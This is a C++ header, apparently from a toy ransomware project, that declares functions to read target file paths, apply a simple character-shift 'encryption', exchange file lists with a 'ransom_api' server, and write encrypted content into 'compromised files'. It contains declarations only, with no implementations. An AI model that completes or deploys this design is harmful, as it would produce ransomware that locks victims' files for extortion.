#pragma once
#include "json.hpp"

// Function to read locations and push them into a vector.
bool getFileContents(std::string fileName, std::vector<std::string> & fileContents);

// Basic function to read all chars and increment them by one. 
void basicEncryptContent(std::string& content, int secretKey);

// Basic function to read all chars and decrement them by one.
void basicDecryptContent(std::string& content, int secretKey);

// Get request to ransom_api.
std::string get_request(std::string uri);

// Post Request to ransom_api.
void post_request(std::string body);

// Delete Request to ransom api.
std::string delete_request(std::string id);

// Function to remove existing stored locations, so we only encrypt those we haven't already.
void locationsMinusServerLocations(std::vector<std::string>& locationsToBeEncrypted, std::vector<std::string>& localVector, std::vector<std::string>& serverVector);

// Function to take Json string and put it into a string vector.
std::vector<std::string> jsonToStringVector(nlohmann::json& j_complete);

// Function to take the content of a text file and place each line into a string vector to go into a vector of string vectors.
std::vector<std::vector<std::string>> fileContentRetreiver(std::vector<std::string> locationsVector);

// Function to inject the encrypted or decrypted content into the compromised files.
void encryptOrDecryptFile(std::vector<std::vector<std::string>>& fileContentVector, std::vector<std::string>& fileLocationsVector);